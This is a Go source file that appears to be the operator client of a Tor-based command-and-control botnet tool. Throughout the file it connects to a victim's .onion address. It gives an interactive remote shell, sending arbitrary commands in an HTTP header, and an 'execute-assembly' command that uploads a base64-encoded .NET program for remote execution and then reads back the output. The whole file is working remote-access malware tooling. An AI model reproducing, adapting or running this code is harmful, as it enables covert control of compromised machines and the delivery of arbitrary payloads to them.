package main

import (
	"bufio"
	"bytes"
	b64 "encoding/base64"
	"fmt"
	"github.com/x3419/TorgoBot/Server/tor/tor"
	"golang.org/x/net/context"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"time"
)

func main() {

	//// This is the code used for establishing a remote shell
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Print("Enter the onion ID: ")
	scanner.Scan()
	onionID := scanner.Text()
	//fmt.Println("Establishing a shell...")
	//doShell(onionID)

	// TODO: Establish "HELLO" connection confirmation
	fmt.Println("\nConnected to " + onionID + "\n")

	for {
		scanner := bufio.NewScanner(os.Stdin)

		fmt.Print(onionID + "> ")
		scanner.Scan()
		cmd := scanner.Text()
		cmdSlice := strings.Split(cmd, " ")
		if len(cmdSlice) > 0 {
			switch cmdSlice[0] {
			case "shell":
				doShell(onionID)
				break
			case "execute-assembly":
				//client_assembly_path := "C:\\Users\\Karp\\Downloads\\Program.exe"
				if len(cmdSlice) > 1 {
					client_assembly_path := strings.Join(cmdSlice[1:], " ")
					doExecuteAssembly(onionID, client_assembly_path)
				} else {
					fmt.Println("Ex) execute-assembly C:\\Users\\Karp\\Downloads\\Program.exe")
				}

				break
			}
		}

	}

	// This is the code for running execute-assembly
	//scanner = bufio.NewScanner(os.Stdin)
	//fmt.Println("Enter the assembly path on the CLIENT:")
	//scanner.Scan()
	//client_assembly_path := scanner.Text()

}

func doExecuteAssembly(id, client_assembly_path string) {

	t, err := tor.Start(nil, nil)
	t.DebugWriter = nil
	t.Control.DebugWriter = nil

	if err != nil {
		//return err
	}
	defer t.Close()

	// Wait at most a minute to start network and get ~~~~~~~~~~~~~~~~~~~ I changed to 15 sec timeout ~~~~~~~~~~~~~
	dialCtx, dialCancel := context.WithTimeout(context.Background(), time.Second*30)
	defer dialCancel()

	// Make connection
	dialer, err := t.Dialer(dialCtx, nil)
	if err != nil {
		//return err
	}

	httpClient := &http.Client{Transport: &http.Transport{DialContext: dialer.DialContext}}

	url := "http://" + id + ".onion/execute-assembly"
	var query = []byte(`asdfbadauthentication123asdf`)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(query))
	req.Header.Set("X-Forwarded-For", "1337")

	// Lets now read our .net assembly as a byte array, then convert it to b64 to then pass in as 'payload' parameter
	assemblyBytes, err := ioutil.ReadFile(client_assembly_path)
	b64ByteArray := b64.StdEncoding.EncodeToString(assemblyBytes)

	req.Header.Set("payload", b64ByteArray)

	resp, err := httpClient.Do(req)
	if err != nil {
		//return err
	}
	defer resp.Body.Close()

	//
	// lets now get the updated results..can't hurt to try again
	//
	//time.Sleep(time.Second*10)
	url = "http://" + id + ".onion/out"

	req, err = http.NewRequest("POST", url, bytes.NewBuffer(query))

	//req, _ = http.NewRequest("POST", url, nil)

	req.Header.Set("X-Forwarded-For", "1337")
	resp, err = httpClient.Do(req)
	if err != nil {
		//return err
	}
	defer resp.Body.Close()
	result, _ := ioutil.ReadAll(resp.Body)
	fmt.Println(string(result))

}

func doShell(id string) {

	t, err := tor.Start(nil, nil)
	t.DebugWriter = nil
	t.Control.DebugWriter = nil

	if err != nil {
		//return err
	}
	defer t.Close()

	// Wait at most a minute to start network and get
	dialCtx, dialCancel := context.WithTimeout(context.Background(), time.Minute)
	defer dialCancel()

	// Make connection
	dialer, err := t.Dialer(dialCtx, nil)
	if err != nil {
		//return err
	}

	httpClient := &http.Client{Transport: &http.Transport{DialContext: dialer.DialContext}}

	url := "http://" + id + ".onion/cmd"
	var query = []byte(`asdfbadauthentication123asdf`)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(query))
	req.Header.Set("X-Forwarded-For", "1337")
	req.Header.Set("Cmd", "whoami")
	resp, err := httpClient.Do(req)
	if err != nil {
		//return err
	}
	defer resp.Body.Close()

	user, _ := ioutil.ReadAll(resp.Body)

	for {

		fmt.Print(strings.Replace(string(user), "\r\n", "", -1) + "> ")
		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()
		cmd := scanner.Text()

		if cmd == "back" {
			return
		}

		url := "http://" + id + ".onion/cmd"
		var query = []byte(`adsfasdfbadauthentication123asfdasdf`)
		req, err := http.NewRequest("POST", url, bytes.NewBuffer(query))
		req.Header.Set("X-Forwarded-For", "1337")
		req.Header.Set("Cmd", cmd)

		resp, err := httpClient.Do(req)
		if err != nil {
			//return err
		}
		defer resp.Body.Close()

		result, _ := ioutil.ReadAll(resp.Body)

		fmt.Println(string(result))
	}

}
